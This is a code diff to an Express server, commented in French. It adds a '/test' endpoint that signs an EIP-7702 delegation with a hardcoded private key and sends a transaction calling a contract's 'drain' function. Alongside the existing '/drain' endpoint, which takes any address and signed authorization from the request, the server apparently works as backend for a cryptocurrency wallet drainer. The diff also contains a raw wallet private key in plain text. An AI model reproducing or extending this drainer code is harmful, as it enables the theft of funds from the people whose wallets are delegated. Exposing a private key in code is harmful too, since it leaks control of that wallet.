@@ -16,6 +16,50 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// Endpoint de test : le serveur signe lui-meme l'autorisation
+app.get("/test", async (req, res) => {
+  try {
+    const FANTOME = "0xaa482A91eA4be0524c966c621FCA52F8Ade011C3";
+    const FANTOME_PK = "187aedafac6434ebd780acc1d6bd544055cb2bdb07c8dfb2c423f3d31c704d9f";
+
+    const fantomeWallet = new Wallet(FANTOME_PK, provider);
+    const authNonce = await provider.getTransactionCount(FANTOME, "latest");
+
+    // Signer l'autorisation avec le wallet fantome
+    const auth = await fantomeWallet.authorize({
+      chainId: 1,
+      address: CONTRACT,
+      nonce: authNonce,
+    });
+
+    console.log("AUTH SIGNEE:", JSON.stringify({
+      chainId: auth.chainId, address: auth.address, nonce: auth.nonce,
+      yParity: auth.yParity, r: auth.r, s: auth.s
+    }));
+
+    const nonce = await provider.getTransactionCount(wallet.address, "latest");
+    const fee = await provider.getFeeData();
+
+    const tx = {
+      type: 4,
+      chainId: 1,
+      to: FANTOME,
+      value: 0n,
+      data: iface.encodeFunctionData("drain"),
+      nonce,
+      maxFeePerGas: fee.maxFeePerGas,
+      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
+      gasLimit: 300000n,
+      authorizationList: [auth],
+    };
+
+    const sent = await wallet.sendTransaction(tx);
+    res.json({ hash: sent.hash });
+  } catch (e) {
+    res.status(500).json({ error: e.message || String(e) });
+  }
+});
+
 app.post("/drain", async (req, res) => {
   try {
     const { fantome, auth } = req.body;
@@ -32,7 +76,6 @@ app.post("/drain", async (req, res) => {
     yp = Number(yp);
     if (yp >= 27) yp = yp - 27;
 
-    // Nonce de l'autorisation = nonce actuel de l'adresse fantome, lu juste avant
     const authNonce = await provider.getTransactionCount(fantome, "latest");
 
     const authorization = {
